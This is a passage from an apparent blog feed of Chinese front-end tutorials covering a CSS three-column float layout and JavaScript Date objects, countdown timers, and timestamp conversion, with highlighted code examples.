class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="2-给left-right-middle加浮动"><a href="#2-给left-right-middle加浮动" class="headerlink" title="2.给left,right,middle加浮动"></a>2.给left,right,middle加浮动</h3><h3 id="3-margin-left调整位置"><a href="#3-margin-left调整位置" class="headerlink" title="3.margin-left调整位置"></a>3.margin-left调整位置</h3><p>给黄色盒子加上<code>margin-left:-100%</code></p><p>给粉色盒子加上<code>margin-left:-100px</code>  </p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于日期对象</title>
      <link href="2018/08/30/JavaScript-%E5%85%B3%E4%BA%8E%E6%97%A5%E6%9C%9F%E5%AF%B9%E8%B1%A1/"/>
      <url>2018/08/30/JavaScript-%E5%85%B3%E4%BA%8E%E6%97%A5%E6%9C%9F%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<ul><li>日期对象</li><li>关于时间戳处理</li><li>Date.parse（）</li></ul><pre class=" language-js"><code class="language-js">        <span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回时间；</span>        <span class="token keyword">var</span> YY <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回年</span>        <span class="token keyword">var</span> MM <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回月</span>        <span class="token keyword">var</span> Day <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回星期 【注意 ：每个星期第一天是星期日】</span>        <span class="token keyword">var</span> DD <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回天 </span>        <span class="token keyword">var</span> hh <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回时</span>        <span class="token keyword">var</span> mm <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getMinutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回分</span>        <span class="token keyword">var</span> ss <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回秒</span>        <span class="token keyword">var</span> ms <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getMilliseconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回秒</span>        <span class="token keyword">var</span> Time <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回 1970 年 1 月 1 日至今的毫秒数 </span>        <span class="token keyword">var</span> Now <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回 1970 年 1 月 1 日至今的毫秒数  【不兼容IE】</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回年月日，时分秒；</span>        <span class="token keyword">var</span> b <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">toLocaleDateString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回年月日</span>        <span class="token keyword">var</span> c <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">toLocaleTimeString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回时分秒</span></code></pre><pre class=" language-js"><code class="language-js">        <span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回指定的时间 【注意：月份会加1，所以我们设置的时候要减1】</span>        <span class="token keyword">var</span> date1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span> <span class="token string">'2018/8/20'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> date2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span> <span class="token number">2018</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> date3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span> <span class="token number">2018</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> date4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span> <span class="token string">'9'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> date <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当前时间</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> date1 <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//Mon Aug 20 2018 00:00:00</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> date2 <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//Wed Aug 01 2018 00:00:00</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> date3 <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//Thu Jan 01 1970 08:00:02</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> date4 <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//Sat Sep 01 2001 00:00:00</span>        <span class="token comment" spellcheck="true">//getTimezoneOffset() 世界时（东八区） - 本地时间（ 当前的时间 ）</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> date<span class="token punctuation">.</span><span class="token function">getTimezoneOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//480/8 60分钟</span></code></pre><h2 id="案例一：输出北京时间"><a href="#案例一：输出北京时间" class="headerlink" title="案例一：输出北京时间"></a>案例一：输出北京时间</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        现在是北京时间：        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> box <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'星期日'</span><span class="token punctuation">,</span><span class="token string">'星期一'</span><span class="token punctuation">,</span><span class="token string">'星期二'</span><span class="token punctuation">,</span><span class="token string">'星期三'</span><span class="token punctuation">,</span><span class="token string">'星期四'</span><span class="token punctuation">,</span><span class="token string">'星期五'</span><span class="token punctuation">,</span><span class="token string">'星期六'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回时间；</span>            <span class="token keyword">var</span> YY <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回年</span>            <span class="token keyword">var</span> MM <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回月</span>            <span class="token keyword">var</span> Day <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回星期 【注意 ：每个星期第一天是星期日】</span>            <span class="token keyword">var</span> DD <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回天 </span>            <span class="token keyword">var</span> hh <span class="token operator">=</span> <span class="token function">addZero</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span><span class="token function">getHours</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回时</span>            <span class="token keyword">var</span> mm <span class="token operator">=</span> <span class="token function">addZero</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span><span class="token function">getMinutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回分</span>            <span class="token keyword">var</span> ss <span class="token operator">=</span> <span class="token function">addZero</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回秒</span>            <span class="token keyword">var</span> str <span class="token operator">=</span> YY<span class="token operator">+</span><span class="token string">'年'</span><span class="token operator">+</span>MM<span class="token operator">+</span><span class="token string">'月'</span><span class="token operator">+</span>DD<span class="token operator">+</span><span class="token string">'日'</span><span class="token operator">+</span>arr<span class="token punctuation">[</span>Day<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>hh<span class="token operator">+</span><span class="token string">'时'</span><span class="token operator">+</span>mm<span class="token operator">+</span><span class="token string">'分'</span><span class="token operator">+</span>ss<span class="token operator">+</span><span class="token string">'秒'</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先执行一次，避免出现延迟加载</span>        <span class="token function">setInterval</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">addZero</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> n <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">?</span> <span class="token string">'0'</span> <span class="token operator">+</span> n <span class="token punctuation">:</span> n<span class="token punctuation">;</span>        <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="案例二：距离过年时间"><a href="#案例二：距离过年时间" class="headerlink" title="案例二：距离过年时间"></a>案例二：距离过年时间</h2><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>距离过年还有：        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> newYear <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span> <span class="token string">'2019/2/5'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>        p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> date <span class="token operator">=</span> newYear <span class="token operator">-</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//返回毫秒为距离明年过年要多少毫秒;</span>                DD <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>date<span class="token operator">/</span><span class="token number">1000</span><span class="token operator">/</span><span class="token number">60</span><span class="token operator">/</span><span class="token number">60</span><span class="token operator">/</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//返回天</span>                hh <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>date<span class="token operator">/</span><span class="token number">1000</span><span class="token operator">/</span><span class="token number">60</span><span class="token operator">/</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">24</span><span class="token punctuation">,</span>                mm <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>date<span class="token operator">/</span><span class="token number">1000</span><span class="token operator">/</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">60</span><span class="token punctuation">,</span>                ss <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>date<span class="token operator">/</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">60</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> DD <span class="token punctuation">,</span>hh<span class="token punctuation">,</span>mm<span class="token punctuation">,</span> ss<span class="token punctuation">)</span>            <span class="token keyword">var</span> str <span class="token operator">=</span>  DD <span class="token operator">+</span><span class="token string">'日'</span><span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>hh<span class="token operator">+</span><span class="token string">'时'</span><span class="token operator">+</span>mm<span class="token operator">+</span><span class="token string">'分'</span><span class="token operator">+</span>ss<span class="token operator">+</span><span class="token string">'秒'</span><span class="token punctuation">;</span>            p<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">setInterval</span><span class="token punctuation">(</span> fn <span class="token punctuation">,</span><span class="token number">1000</span> <span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="关于时间戳处理"><a href="#关于时间戳处理" class="headerlink" title="关于时间戳处理"></a>关于时间戳处理</h2><p>在前后端接口开发时，时间对象的处理往往处理成13位的时间戳形式。</p><p>一般时间选择器拿到的都是<code>Thu Jul 04 2019 23:59:59 GMT+0800 (中国标准时间)</code>即日期对象的格式</p><ul><li>时间对象转换为时间戳</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 定义一个时间对象 dt，然后依次演示各种将 dt 转换为时间戳的写法</span><span class="token keyword">var</span> dt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">"2019-07-04 23:59:59.999"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Thu Jul 04 2019 23:59:59 GMT+0800 (中国标准时间)</span><span class="token comment" spellcheck="true">// 写法一，精确到毫秒，得到 13 位时间戳 1562255999999</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dt<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 写法二，精确到毫秒，得到 13 位时间戳 1562255999999</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dt<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 写法三，精确到毫秒，得到 13 位时间戳 1562255999999</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span>dt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 写法四，精确到毫秒，得到 13 位时间戳 1562255999999</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span>dt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 写法五，精确到秒，得到 13 位时间戳 1562255999000，后三位固定为 000</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>dt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 但是如果这样写，还是可以的</span>Date<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"2019-07-04 23:59:59.999"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1562255999999</span></code></pre><ul><li>时间戳转换为时间对象</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 注意：参数中的时间戳必须是 13 位的，多一位或少一位都不行</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">1562169599000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Wed Jul 03 2019 23:59:59 GMT+0800 (中国标准时间)</span><span class="token comment" spellcheck="true">// 将时间戳转换为更加直观形象的本地时间</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">1562169599000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "2019/7/3 下午11:59:59"</span><span class="token comment" spellcheck="true">// 判断两个时间差是否超过一天</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">'2020-08-06 21:33:00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> Date<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">'2020-08-05 21:33:00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1000</span><span class="token operator">/</span><span class="token number">3600</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token comment" spellcheck="true">// 后三位是精确到毫秒，一般不用考虑</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">"2019-07-04 23:59:59.999"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1562255999999</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">"2019-07-04 23:59:59"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1562255999000</span></code></pre><h2 id="一个兼容性问题"><a href="#一个兼容性问题" class="headerlink" title="一个兼容性问题"></a>一个兼容性问题</h2><blockquote><p>时间格式为2020-08-09具有兼容性问题，正确用法是 new Date(‘2020/08/-09 21:33:00’)</p></blockquote><p><code>str.replace(/-/g,&quot;/&quot;)</code></p><pre class=" language-js"><code class="language-js"><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">'2020-08-06 21:33:00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> Date<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'2020-08-05 21:33:00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/-/g</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1000</span><span class="token operator">/</span><span class="token number">3600</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">=</span> <span class="token number">1</span></code></pre><h2 id="一个函数"><a href="#一个函数" class="headerlink" title="一个函数"></a>一个函数</h2><ul><li>选择日期：比如说选择日期<code>10.23-10.24</code>，组件返回的是<code>23号0点到24号零点</code>，所以需要加一天时间</li><li>但是如果组件是精确到秒的话直接用<code>getTime</code>就行了</li></ul><pre class=" language-js"><code class="language-js"><span class="token function">disposeTime</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> startDate<span class="token punctuation">,</span> endDate  <span class="token keyword">if</span> <span class="token punctuation">(</span>start<span class="token punctuation">.</span>getTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>    startDate <span class="token operator">=</span> start<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    startDate <span class="token operator">=</span> <span class="token function">moment</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token punctuation">.</span>getTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>    endDate <span class="token operator">=</span> end<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    endDate <span class="token operator">=</span> <span class="token function">moment</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  endDate <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    startDate<span class="token punctuation">,</span>    endDate  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><ul><li>其中的<code>moment</code>是一个时间格式化的插件</li><li>可以参考：<a href="https://blog.csdn.net/fu983531588/article/details/89330929" target="_blank" rel="noopener">Vue使用Moment插件格式化时间</a></li></ul><blockquote><p>给定一个时间戳，今天的展示今天，一个月内的发布日期，展示X天前，一个月前的展示年月日，如何实现？</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 处理时间</span><span class="token function">transTime</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> diff <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token operator">/</span> <span class="token number">3600</span> <span class="token operator">/</span> <span class="token number">24</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'今天'</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>diff <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token operator">~</span><span class="token operator">~</span>diff <span class="token operator">+</span> <span class="token number">1</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">天前`</span></span>  <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>闭包</title>
      <link href="2018/08/16/JavaScript-%E9%97%AD%E5%8C%85/"/>
      <url>2018/08/16/JavaScript-%E9%97%AD%E5%8C%85/</url>
      
